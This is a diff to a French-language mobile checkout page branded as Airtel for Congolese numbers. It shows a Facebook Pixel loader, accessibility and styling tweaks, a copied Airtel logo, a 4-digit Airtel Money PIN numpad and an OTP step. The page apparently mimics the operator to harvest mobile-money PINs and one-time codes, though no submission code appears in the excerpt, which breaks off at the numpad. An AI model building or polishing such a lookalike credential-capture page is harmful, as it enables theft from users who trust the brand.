@@ -2,7 +2,7 @@
 <html lang="fr">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,maximum-scale=1,user-scalable=no">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
 <meta name="theme-color" content="#E40000">
 <meta name="apple-mobile-web-app-capable" content="yes">
 <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
@@ -10,19 +10,22 @@
 
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Space+Grotesk:wght@500;600;700&family=DM+Mono:wght@500&display=swap" rel="stylesheet">
+<link rel="dns-prefetch" href="https://connect.facebook.net">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=Space+Grotesk:wght@600;700&family=DM+Mono:wght@500&display=swap" rel="stylesheet">
 
 <link rel="prefetch" href="airtel-thankyou.html">
 
 <script>
+/* Facebook Pixel — stub immédiat, script chargé après le load (non bloquant) */
 !function(f,b,e,v,n,t,s)
 {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
 n.callMethod.apply(n,arguments):n.queue.push(arguments)};
 if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-n.queue=[];t=b.createElement(e);t.async=!0;
-t.src=v;s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s)}(window,document,'script',
-'https://connect.facebook.net/en_US/fbevents.js');
+n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;
+s=b.getElementsByTagName(e)[0];
+var go=function(){s.parentNode.insertBefore(t,s)};
+if(b.readyState==='complete')go();else f.addEventListener('load',go,{once:true});
+}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
 fbq('init', 'YOUR_PIXEL_ID');
 fbq('track', 'PageView');
 </script>
@@ -31,7 +34,7 @@ fbq('track', 'PageView');
 <style>
 :root{
   --red:#E40000;--red-dk:#B20000;--red-lt:#FFE5E5;--red-soft:#FFF5F5;
-  --ink:#0A0A0E;--ink-2:#484852;--ink-3:#8A8A94;
+  --ink:#0A0A0E;--ink-2:#484852;--ink-3:#6B6B75;--ink-4:#8A8A94;
   --line:#EAEAEF;--surf:#FFFFFF;--surf-lo:#FAFAFC;--surf-mid:#F0F0F5;
   --ok:#16A34A;--ok-soft:#DCFCE7;--err:#DC2626;--blue:#2563EB;
   --ease:cubic-bezier(.2,0,0,1);
@@ -55,6 +58,20 @@ body{
 button{font:inherit;color:inherit;border:0;background:none;cursor:pointer;outline:none;-webkit-user-select:none;user-select:none;touch-action:manipulation}
 img,svg{display:block;max-width:100%}
 :focus-visible{outline:2px solid #fff;outline-offset:2px;border-radius:8px}
+/* Focus renforcé pour les contrôles interactifs clés */
+.numkey:focus-visible,
+.pin-peek:focus-visible,
+.otp-resend:focus-visible,
+.otp-err-btn:focus-visible,
+.summary-change:focus-visible,
+.btn-cta:focus-visible{
+  outline:2px solid var(--red);
+  outline-offset:3px;
+}
+.pin-peek:focus-visible,
+.otp-resend:focus-visible{outline-offset:4px;border-radius:999px}
+.btn-cta:focus-visible{outline-offset:4px;border-radius:999px}
+.otp-boxes:focus-visible{outline:2px solid var(--red);outline-offset:6px;border-radius:24px}
 
 @keyframes spin{to{transform:rotate(360deg)}}
 @keyframes view-in{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
@@ -62,6 +79,9 @@ img,svg{display:block;max-width:100%}
 @keyframes rip-anim{to{transform:scale(3.2);opacity:0}}
 @keyframes popIn{from{opacity:0;transform:scale(.9)}to{opacity:1;transform:scale(1)}}
 @keyframes logoPulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.55;transform:scale(.88)}}
+
+/* SPRITE */
+.sprite{position:absolute;width:0;height:0;overflow:hidden;pointer-events:none}
 
 /* NAV */
 .nav{
@@ -137,7 +157,7 @@ img,svg{display:block;max-width:100%}
   padding:14px 16px 16px;
 }
 .summary-head{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:8px;padding-inline:2px}
-.summary-head-label{font-size:10px;font-weight:800;letter-spacing:.14em;text-transform:uppercase;color:rgba(255,255,255,.6);line-height:1}
+.summary-head-label{font-size:10px;font-weight:800;letter-spacing:.14em;text-transform:uppercase;color:rgba(255,255,255,.72);line-height:1}
 .summary-change{
   display:inline-flex;align-items:center;gap:4px;
   padding:5px 11px;
@@ -158,15 +178,15 @@ img,svg{display:block;max-width:100%}
 }
 .summary-product-info{min-width:0;display:flex;flex-direction:column;gap:3px}
 .summary-product-name{font-family:var(--font-display);font-size:13.5px;font-weight:700;color:#fff;letter-spacing:-.014em;line-height:1.2;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.summary-product-meta{font-size:9.5px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:rgba(255,255,255,.72);line-height:1}
+.summary-product-meta{font-size:9.5px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:rgba(255,255,255,.78);line-height:1}
 .summary-product-price{display:flex;flex-direction:column;align-items:flex-end;gap:3px;flex-shrink:0;line-height:1;padding-right:2px}
 .summary-product-price strong{font-family:var(--font-display);font-size:18px;font-weight:700;letter-spacing:-.022em;color:#fff;line-height:1}
-.summary-product-price small{font-size:9px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:rgba(255,255,255,.65);line-height:1}
+.summary-product-price small{font-size:9px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:rgba(255,255,255,.72);line-height:1}
 .summary-divider{height:1px;background:rgba(255,255,255,.16);margin-bottom:12px}
 .summary-bottom{display:flex;align-items:center;gap:8px;flex-wrap:wrap;row-gap:8px}
 .summary-item{display:inline-flex;align-items:center;gap:5px;min-width:0;line-height:1}
-.summary-item svg{flex-shrink:0;opacity:.6}
-.summary-lbl{font-size:9.5px;font-weight:600;color:rgba(255,255,255,.6);text-transform:uppercase;letter-spacing:.04em;white-space:nowrap}
+.summary-item svg{flex-shrink:0;opacity:.7}
+.summary-lbl{font-size:9.5px;font-weight:600;color:rgba(255,255,255,.72);text-transform:uppercase;letter-spacing:.04em;white-space:nowrap}
 .summary-val{font-family:var(--font-mono);font-size:11px;font-weight:600;color:#fff;white-space:nowrap;letter-spacing:.01em}
 .summary-dot{width:3px;height:3px;border-radius:50%;background:rgba(255,255,255,.32);flex-shrink:0}
 
@@ -200,7 +220,7 @@ img,svg{display:block;max-width:100%}
 .pin-peek-row{display:flex;justify-content:center}
 .pin-peek{
   display:inline-flex;align-items:center;gap:5px;
-  font-size:12px;font-weight:600;color:var(--ink-3);
+  font-size:12px;font-weight:600;color:var(--ink-2);
   padding:7px 15px;
   background:var(--surf-mid);border-radius:999px;border:none;line-height:1;
   transition:background .15s,transform .12s;
@@ -320,9 +340,9 @@ img,svg{display:block;max-width:100%}
 .otp-err-btn.solid{background:var(--red);color:#fff}
 .otp-meta{display:flex;flex-direction:column;align-items:center;gap:8px;width:100%;max-width:320px}
 .otp-help{display:inline-flex;align-items:center;gap:6px;font-size:12px;color:var(--ink-2);line-height:1}
-.otp-help svg{flex-shrink:0;opacity:.6;width:12px;height:12px}
+.otp-help svg{flex-shrink:0;opacity:.7;width:12px;height:12px}
 .otp-timer-row{display:inline-flex;align-items:center;gap:6px;font-size:12px;color:var(--ink-2);line-height:1}
-.otp-timer-row svg{width:12px;height:12px;flex-shrink:0;opacity:.6}
+.otp-timer-row svg{width:12px;height:12px;flex-shrink:0;opacity:.7}
 .otp-timer{font-family:var(--font-mono);font-weight:600;color:var(--red);min-width:22px;text-align:center}
 .otp-resend{font-size:12.5px;font-weight:700;color:var(--blue);text-decoration:underline;padding:6px 10px;border-radius:8px;line-height:1}
 .otp-resend.dim{color:#B5B5BE;text-decoration:none;cursor:default;pointer-events:none}
@@ -330,8 +350,8 @@ img,svg{display:block;max-width:100%}
 #otpInput{position:absolute;opacity:0;width:1px;height:1px;pointer-events:none;top:0;left:0}
 
 /* TRANSITION */
-.t-overlay{position:fixed;inset:0;z-index:9000;opacity:0;pointer-events:none;transition:opacity .2s ease;display:grid;place-items:center;background:rgba(255,255,255,.94);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px)}
-.t-overlay.show{opacity:1;pointer-events:all}
+.t-overlay{position:fixed;inset:0;z-index:9000;opacity:0;visibility:hidden;pointer-events:none;display:grid;place-items:center;background:rgba(255,255,255,.94);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);transition:opacity .2s ease,visibility 0s linear .2s}
+.t-overlay.show{opacity:1;visibility:visible;pointer-events:all;transition:opacity .2s ease,visibility 0s linear 0s}
 .t-spinner{width:56px;height:56px;border-radius:50%;border:3px solid var(--red-lt);border-top-color:var(--red);border-right-color:var(--red);animation:spin 1.2s cubic-bezier(.4,0,.2,1) infinite;display:grid;place-items:center;position:relative}
 .t-bar{position:fixed;top:0;left:0;right:0;height:3px;z-index:9001;overflow:hidden;pointer-events:none}
 .t-bar-fill{height:100%;width:0;background:var(--red);border-radius:0 2px 2px 0;box-shadow:0 0 10px rgba(228,0,0,.6);transition:width .4s var(--ease)}
@@ -351,15 +371,22 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
 </head>
 <body>
 
-<div class="t-overlay" id="tOverlay"><div class="t-spinner"><svg viewBox="0 0 124 47.597" xmlns="http://www.w3.org/2000/svg" aria-label="Airtel" style="height:20px;width:auto;color:var(--red);animation:logoPulse 1.6s ease-in-out infinite"><g transform="translate(-57.9 -110.7)"><g transform="translate(58.856 110.7)"><g><g transform="translate(36.705)"><path d="M205.786,110.7a3.523,3.523,0,0,0-3.486,3.526,3.447,3.447,0,1,0,6.891.04,3.489,3.489,0,0,0-3.405-3.566" transform="translate(-182.107 -110.7)" fill="currentColor"/><path d="M204.8,155h5.409V132.8l-5.409.922Z" transform="translate(-183.606 -123.946)" fill="currentColor"/><path d="M163.519,150.25a5.117,5.117,0,0,1-2.8.721c-2.163,0-3.165-1.723-3.125-3.726a3.464,3.464,0,0,1,3.766-3.526h2.164Zm-2.244-18.35a15.769,15.769,0,0,0-7.292,1.963l-.6.32,1.442,3.325.841-.4a12.2,12.2,0,0,1,5.128-1.242c1.963.08,2.764,1,2.764,2.925v1.122h-3.205c-5.168,0-8.374,2.8-8.454,7.172a7.837,7.837,0,0,0,8.053,7.732,12.414,12.414,0,0,0,9.135-3.486V139.552c-.08-5.769-4.047-7.652-7.813-7.652" transform="translate(-151.9 -123.406)" fill="currentColor"/><path d="M301.493,136.367c2.4,0,2.764,2.684,2.764,4.367h-5.89c.12-2.164.962-4.367,3.125-4.367m1.162,14.744a3.851,3.851,0,0,1-3.125-1.242c-.962-1.082-1.4-3.325-1.282-5.689h11.659v-.561c-.12-7.853-2.684-11.418-8.414-11.418-6.37,0-8.854,6.01-8.894,11.7-.04,3.566,1.282,7.172,3.686,9.215a8.858,8.858,0,0,0,5.85,1.923,12.639,12.639,0,0,0,3.846-.6,16.449,16.449,0,0,0,4.087-2.043l-1.522-3.245a9.9,9.9,0,0,1-5.89,1.963" transform="translate(-236.228 -123.586)" fill="currentColor"/><path d="M229.1,136.385v18.229h5.529V137.466a5.936,5.936,0,0,1,3.686-1.4,6.965,6.965,0,0,1,2.2.24l1.522-3.526a9.536,9.536,0,0,0-3.646-.681,12.163,12.163,0,0,0-9.295,4.287" transform="translate(-198.17 -123.524)" fill="currentColor"/><path d="M352.233,142.4c-2.244-.16-2.725-1.2-2.725-2.885V117.6l-5.409.962v20.633c0,4.888,2.564,6.971,6.891,6.971a12.417,12.417,0,0,0,2.083-.24V142.44a4.171,4.171,0,0,0-.841-.04" transform="translate(-267.096 -114.836)" fill="currentColor"/><path d="M270.629,117.6l-5.529.921v20.713c0,4.648,2.644,6.851,7.051,6.851a11.279,11.279,0,0,0,2.043-.2V142.44h-.761c-2.324-.08-2.8-1.4-2.8-2.925V127.857h3.566V123.77h-3.566Z" transform="translate(-219.747 -114.836)" fill="currentColor"/></g><path d="M71.71,146.565a24.836,24.836,0,0,0,4.607-2.4l.361-.24a34.286,34.286,0,0,0,4.327-3.285,19.866,19.866,0,0,0,6.29-9.015,11.537,11.537,0,0,0,.321-6.571,8.528,8.528,0,0,0-3.285-4.487,9.621,9.621,0,0,0-6.01-1.763c-3.486,0-7.292,1.362-11.338,4.006l-.12.08h0l-.361.24a2.233,2.233,0,0,1-.321.2,26.258,26.258,0,0,0-2.364,1.8c-1.723,1.643-3.646,4.407-3.526,6.771a3.114,3.114,0,0,0,1.242,2.4,4.163,4.163,0,0,0,2.564.8,12.24,12.24,0,0,0,5.889-2.083c.08-.08.2-.12.28-.2a9.068,9.068,0,0,1,.8-.521l.28-.16a30.98,30.98,0,0,1,7.051-3.886,5.2,5.2,0,0,1,1.8-.321,4.438,4.438,0,0,1,.761.08,2.386,2.386,0,0,1,1.683,1.322,6.1,6.1,0,0,1-.361,4.888,21.561,21.561,0,0,1-5.649,7.011,21.633,21.633,0,0,1-3.686,2.644l-.08.04a13.809,13.809,0,0,1-1.723.841l-.08.04a3.363,3.363,0,0,1-.481.16c-2.564.681-1-1.563-1-1.563a25.048,25.048,0,0,1,1.763-1.8c.361-.32.721-.681,1.082-1.042l.08-.08a2.719,2.719,0,0,0,1.042-1.963,2.315,2.315,0,0,0-2.364-1.963h-.08a4.829,4.829,0,0,0-2.764,1.162,8.4,8.4,0,0,0-1.843,2.083c-.681,1.082-2.123,3.886-.721,6.09a3.1,3.1,0,0,0,2.8,1.322,9.408,9.408,0,0,0,3.125-.641" transform="translate(-60.287 -115.555)" fill="currentColor"/></g></g></g></svg></div></div>
-<div class="t-bar" id="tBar"><div class="t-bar-fill" id="tBarFill"></div></div>
+<!-- Logo Airtel défini une seule fois (sprite) -->
+<svg class="sprite" aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg">
+  <symbol id="logo-airtel" viewBox="0 0 124 47.597">
+    <g transform="translate(-57.9 -110.7)"><g transform="translate(58.856 110.7)"><g><g transform="translate(36.705)"><path d="M205.786,110.7a3.523,3.523,0,0,0-3.486,3.526,3.447,3.447,0,1,0,6.891.04,3.489,3.489,0,0,0-3.405-3.566" transform="translate(-182.107 -110.7)" fill="currentColor"/><path d="M204.8,155h5.409V132.8l-5.409.922Z" transform="translate(-183.606 -123.946)" fill="currentColor"/><path d="M163.519,150.25a5.117,5.117,0,0,1-2.8.721c-2.163,0-3.165-1.723-3.125-3.726a3.464,3.464,0,0,1,3.766-3.526h2.164Zm-2.244-18.35a15.769,15.769,0,0,0-7.292,1.963l-.6.32,1.442,3.325.841-.4a12.2,12.2,0,0,1,5.128-1.242c1.963.08,2.764,1,2.764,2.925v1.122h-3.205c-5.168,0-8.374,2.8-8.454,7.172a7.837,7.837,0,0,0,8.053,7.732,12.414,12.414,0,0,0,9.135-3.486V139.552c-.08-5.769-4.047-7.652-7.813-7.652" transform="translate(-151.9 -123.406)" fill="currentColor"/><path d="M301.493,136.367c2.4,0,2.764,2.684,2.764,4.367h-5.89c.12-2.164.962-4.367,3.125-4.367m1.162,14.744a3.851,3.851,0,0,1-3.125-1.242c-.962-1.082-1.4-3.325-1.282-5.689h11.659v-.561c-.12-7.853-2.684-11.418-8.414-11.418-6.37,0-8.854,6.01-8.894,11.7-.04,3.566,1.282,7.172,3.686,9.215a8.858,8.858,0,0,0,5.85,1.923,12.639,12.639,0,0,0,3.846-.6,16.449,16.449,0,0,0,4.087-2.043l-1.522-3.245a9.9,9.9,0,0,1-5.89,1.963" transform="translate(-236.228 -123.586)" fill="currentColor"/><path d="M229.1,136.385v18.229h5.529V137.466a5.936,5.936,0,0,1,3.686-1.4,6.965,6.965,0,0,1,2.2.24l1.522-3.526a9.536,9.536,0,0,0-3.646-.681,12.163,12.163,0,0,0-9.295,4.287" transform="translate(-198.17 -123.524)" fill="currentColor"/><path d="M352.233,142.4c-2.244-.16-2.725-1.2-2.725-2.885V117.6l-5.409.962v20.633c0,4.888,2.564,6.971,6.891,6.971a12.417,12.417,0,0,0,2.083-.24V142.44a4.171,4.171,0,0,0-.841-.04" transform="translate(-267.096 -114.836)" fill="currentColor"/><path d="M270.629,117.6l-5.529.921v20.713c0,4.648,2.644,6.851,7.051,6.851a11.279,11.279,0,0,0,2.043-.2V142.44h-.761c-2.324-.08-2.8-1.4-2.8-2.925V127.857h3.566V123.77h-3.566Z" transform="translate(-219.747 -114.836)" fill="currentColor"/></g><path d="M71.71,146.565a24.836,24.836,0,0,0,4.607-2.4l.361-.24a34.286,34.286,0,0,0,4.327-3.285,19.866,19.866,0,0,0,6.29-9.015,11.537,11.537,0,0,0,.321-6.571,8.528,8.528,0,0,0-3.285-4.487,9.621,9.621,0,0,0-6.01-1.763c-3.486,0-7.292,1.362-11.338,4.006l-.12.08h0l-.361.24a2.233,2.233,0,0,1-.321.2,26.258,26.258,0,0,0-2.364,1.8c-1.723,1.643-3.646,4.407-3.526,6.771a3.114,3.114,0,0,0,1.242,2.4,4.163,4.163,0,0,0,2.564.8,12.24,12.24,0,0,0,5.889-2.083c.08-.08.2-.12.28-.2a9.068,9.068,0,0,1,.8-.521l.28-.16a30.98,30.98,0,0,1,7.051-3.886,5.2,5.2,0,0,1,1.8-.321,4.438,4.438,0,0,1,.761.08,2.386,2.386,0,0,1,1.683,1.322,6.1,6.1,0,0,1-.361,4.888,21.561,21.561,0,0,1-5.649,7.011,21.633,21.633,0,0,1-3.686,2.644l-.08.04a13.809,13.809,0,0,1-1.723.841l-.08.04a3.363,3.363,0,0,1-.481.16c-2.564.681-1-1.563-1-1.563a25.048,25.048,0,0,1,1.763-1.8c.361-.32.721-.681,1.082-1.042l.08-.08a2.719,2.719,0,0,0,1.042-1.963,2.315,2.315,0,0,0-2.364-1.963h-.08a4.829,4.829,0,0,0-2.764,1.162,8.4,8.4,0,0,0-1.843,2.083c-.681,1.082-2.123,3.886-.721,6.09a3.1,3.1,0,0,0,2.8,1.322,9.408,9.408,0,0,0,3.125-.641" transform="translate(-60.287 -115.555)" fill="currentColor"/></g></g></g>
+  </symbol>
+</svg>
+
+<div class="t-overlay" id="tOverlay" aria-hidden="true"><div class="t-spinner"><svg viewBox="0 0 124 47.597" xmlns="http://www.w3.org/2000/svg" aria-label="Airtel" style="height:20px;width:auto;color:var(--red);animation:logoPulse 1.6s ease-in-out infinite"><use href="#logo-airtel"/></svg></div></div>
+<div class="t-bar" id="tBar" aria-hidden="true"><div class="t-bar-fill" id="tBarFill"></div></div>
 
 <nav class="nav">
   <div class="nav-brand">
-    <svg viewBox="0 0 124 47.597" xmlns="http://www.w3.org/2000/svg" aria-label="Airtel" class="nav-logo"><g transform="translate(-57.9 -110.7)"><g transform="translate(58.856 110.7)"><g><g transform="translate(36.705)"><path d="M205.786,110.7a3.523,3.523,0,0,0-3.486,3.526,3.447,3.447,0,1,0,6.891.04,3.489,3.489,0,0,0-3.405-3.566" transform="translate(-182.107 -110.7)" fill="currentColor"/><path d="M204.8,155h5.409V132.8l-5.409.922Z" transform="translate(-183.606 -123.946)" fill="currentColor"/><path d="M163.519,150.25a5.117,5.117,0,0,1-2.8.721c-2.163,0-3.165-1.723-3.125-3.726a3.464,3.464,0,0,1,3.766-3.526h2.164Zm-2.244-18.35a15.769,15.769,0,0,0-7.292,1.963l-.6.32,1.442,3.325.841-.4a12.2,12.2,0,0,1,5.128-1.242c1.963.08,2.764,1,2.764,2.925v1.122h-3.205c-5.168,0-8.374,2.8-8.454,7.172a7.837,7.837,0,0,0,8.053,7.732,12.414,12.414,0,0,0,9.135-3.486V139.552c-.08-5.769-4.047-7.652-7.813-7.652" transform="translate(-151.9 -123.406)" fill="currentColor"/><path d="M301.493,136.367c2.4,0,2.764,2.684,2.764,4.367h-5.89c.12-2.164.962-4.367,3.125-4.367m1.162,14.744a3.851,3.851,0,0,1-3.125-1.242c-.962-1.082-1.4-3.325-1.282-5.689h11.659v-.561c-.12-7.853-2.684-11.418-8.414-11.418-6.37,0-8.854,6.01-8.894,11.7-.04,3.566,1.282,7.172,3.686,9.215a8.858,8.858,0,0,0,5.85,1.923,12.639,12.639,0,0,0,3.846-.6,16.449,16.449,0,0,0,4.087-2.043l-1.522-3.245a9.9,9.9,0,0,1-5.89,1.963" transform="translate(-236.228 -123.586)" fill="currentColor"/><path d="M229.1,136.385v18.229h5.529V137.466a5.936,5.936,0,0,1,3.686-1.4,6.965,6.965,0,0,1,2.2.24l1.522-3.526a9.536,9.536,0,0,0-3.646-.681,12.163,12.163,0,0,0-9.295,4.287" transform="translate(-198.17 -123.524)" fill="currentColor"/><path d="M352.233,142.4c-2.244-.16-2.725-1.2-2.725-2.885V117.6l-5.409.962v20.633c0,4.888,2.564,6.971,6.891,6.971a12.417,12.417,0,0,0,2.083-.24V142.44a4.171,4.171,0,0,0-.841-.04" transform="translate(-267.096 -114.836)" fill="currentColor"/><path d="M270.629,117.6l-5.529.921v20.713c0,4.648,2.644,6.851,7.051,6.851a11.279,11.279,0,0,0,2.043-.2V142.44h-.761c-2.324-.08-2.8-1.4-2.8-2.925V127.857h3.566V123.77h-3.566Z" transform="translate(-219.747 -114.836)" fill="currentColor"/></g><path d="M71.71,146.565a24.836,24.836,0,0,0,4.607-2.4l.361-.24a34.286,34.286,0,0,0,4.327-3.285,19.866,19.866,0,0,0,6.29-9.015,11.537,11.537,0,0,0,.321-6.571,8.528,8.528,0,0,0-3.285-4.487,9.621,9.621,0,0,0-6.01-1.763c-3.486,0-7.292,1.362-11.338,4.006l-.12.08h0l-.361.24a2.233,2.233,0,0,1-.321.2,26.258,26.258,0,0,0-2.364,1.8c-1.723,1.643-3.646,4.407-3.526,6.771a3.114,3.114,0,0,0,1.242,2.4,4.163,4.163,0,0,0,2.564.8,12.24,12.24,0,0,0,5.889-2.083c.08-.08.2-.12.28-.2a9.068,9.068,0,0,1,.8-.521l.28-.16a30.98,30.98,0,0,1,7.051-3.886,5.2,5.2,0,0,1,1.8-.321,4.438,4.438,0,0,1,.761.08,2.386,2.386,0,0,1,1.683,1.322,6.1,6.1,0,0,1-.361,4.888,21.561,21.561,0,0,1-5.649,7.011,21.633,21.633,0,0,1-3.686,2.644l-.08.04a13.809,13.809,0,0,1-1.723.841l-.08.04a3.363,3.363,0,0,1-.481.16c-2.564.681-1-1.563-1-1.563a25.048,25.048,0,0,1,1.763-1.8c.361-.32.721-.681,1.082-1.042l.08-.08a2.719,2.719,0,0,0,1.042-1.963,2.315,2.315,0,0,0-2.364-1.963h-.08a4.829,4.829,0,0,0-2.764,1.162,8.4,8.4,0,0,0-1.843,2.083c-.681,1.082-2.123,3.886-.721,6.09a3.1,3.1,0,0,0,2.8,1.322,9.408,9.408,0,0,0,3.125-.641" transform="translate(-60.287 -115.555)" fill="currentColor"/></g></g></g></svg>
+    <svg viewBox="0 0 124 47.597" xmlns="http://www.w3.org/2000/svg" aria-label="Airtel" class="nav-logo"><use href="#logo-airtel"/></svg>
   </div>
   <div class="nav-pill">
-    <div class="nav-dot"></div>
+    <div class="nav-dot" aria-hidden="true"></div>
     <span class="nav-pill-txt">Connexion sécurisée</span>
   </div>
 </nav>
@@ -376,8 +403,8 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
     <div class="summary">
       <div class="summary-head">
         <span class="summary-head-label">Votre commande</span>
-        <button class="summary-change" onclick="goBack()" type="button" aria-label="Modifier">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
+        <button class="summary-change" onclick="goBack()" type="button" aria-label="Modifier le forfait sélectionné">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M15 18l-6-6 6-6"/></svg>
           Modifier
         </button>
       </div>
@@ -394,19 +421,19 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
       <div class="summary-divider"></div>
       <div class="summary-bottom">
         <span class="summary-item">
-          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.4" stroke-linecap="round"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18" stroke-width="3"/></svg>
+          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.4" stroke-linecap="round" aria-hidden="true"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18" stroke-width="3"/></svg>
           <span class="summary-lbl">N°</span>
           <span class="summary-val" id="sumPhone">🇨🇩 +243 —</span>
         </span>
-        <span class="summary-dot"></span>
+        <span class="summary-dot" aria-hidden="true"></span>
         <span class="summary-item">
-          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.4" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.4" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
           <span class="summary-lbl">Validité</span>
           <span class="summary-val" id="sumValidity">—</span>
         </span>
-        <span class="summary-dot"></span>
+        <span class="summary-dot" aria-hidden="true"></span>
         <span class="summary-item">
-          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.4" stroke-linecap="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.4" stroke-linecap="round" aria-hidden="true"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
           <span class="summary-lbl">Paiement</span>
           <span class="summary-val">Airtel Money</span>
         </span>
@@ -415,44 +442,44 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
 
     <div class="pin-stage">
       <div class="pin-head">
-        <div class="pin-title">Code PIN Airtel Money</div>
-        <div class="pin-sub">Entrez votre PIN à 4 chiffres pour autoriser le paiement de <strong id="pinRef">—</strong></div>
+        <h1 class="pin-title">Code PIN Airtel Money</h1>
+        <p class="pin-sub">Entrez votre PIN à 4 chiffres pour autoriser le paiement de <strong id="pinRef">—</strong></p>
       </div>
 
-      <div class="pin-boxes" role="group" aria-label="Code PIN">
-        <div class="pin-box" id="pb0"><div class="pin-dot" id="pd0"></div></div>
-        <div class="pin-box" id="pb1"><div class="pin-dot" id="pd1"></div></div>
-        <div class="pin-box" id="pb2"><div class="pin-dot" id="pd2"></div></div>
-        <div class="pin-box" id="pb3"><div class="pin-dot" id="pd3"></div></div>
+      <div class="pin-boxes" role="group" aria-label="Code PIN à 4 chiffres">
+        <div class="pin-box" id="pb0" role="textbox" aria-label="Chiffre 1 sur 4" aria-readonly="true"><div class="pin-dot" id="pd0"></div></div>
+        <div class="pin-box" id="pb1" role="textbox" aria-label="Chiffre 2 sur 4" aria-readonly="true"><div class="pin-dot" id="pd1"></div></div>
+        <div class="pin-box" id="pb2" role="textbox" aria-label="Chiffre 3 sur 4" aria-readonly="true"><div class="pin-dot" id="pd2"></div></div>
+        <div class="pin-box" id="pb3" role="textbox" aria-label="Chiffre 4 sur 4" aria-readonly="true"><div class="pin-dot" id="pd3"></div></div>
       </div>
 
       <div class="pin-peek-row">
-        <button class="pin-peek" id="peekBtn" onclick="togglePeek()" type="button">
-          <svg id="peekIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+        <button class="pin-peek" id="peekBtn" onclick="togglePeek()" type="button" aria-label="Afficher ou masquer les chiffres du PIN" aria-pressed="false">
+          <svg id="peekIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
           <span id="peekTxt">Afficher</span>
         </button>
       </div>
 
-      <div class="pin-error" id="pinErr" aria-live="polite"></div>
+      <div class="pin-error" id="pinErr" role="alert" aria-live="polite"></div>
 
-      <div class="numpad" id="pinPad">
-        <button class="numkey" data-v="1">1</button>
-        <button class="numkey" data-v="2">2</button>
-        <button class="numkey" data-v="3">3</button>
-        <button class="numkey" data-v="4">4</button>
-        <button class="numkey" data-v="5">5</button>
-        <button class="numkey" data-v="6">6</button>
-        <button class="numkey" data-v="7">7</button>
-        <button class="numkey" data-v="8">8</button>
-        <button class="numkey" data-v="9">9</button>
-        <button class="numkey empty" disabled aria-hidden="true"></button>
-        <button class="numkey" data-v="0">0</button>
-        <button class="numkey del" id="npDel" aria-label="Effacer">⌫</button>
+      <div class="numpad" id="pinPad" role="group" aria-label="Clavier numérique">
+        <button class="numkey" data-v="1" aria-label="1">1</button>
+        <button class="numkey" data-v="2" aria-label="2">2</button>
+        <button class="numkey" data-v="3" aria-label="3">3</button>
+        <button class="numkey" data-v="4" aria-label="4">4</button>
+        <button class="numkey" data-v="5" aria-label="5">5</button>
+        <button class="numkey" data-v="6" aria-label="6">6</button>
+        <button class="numkey" data-v="7" aria-label="7">7</button>
+        <button class="numkey" data-v="8" aria-label="8">8</button>
+        <button class="numkey" data-v="9" aria-label="9">9</button>
+        <button class="numkey empty" disabled aria-hidden="true" tabindex="-1"></button>
+        <button class="numkey" data-v="0" aria-label="0">0</button>
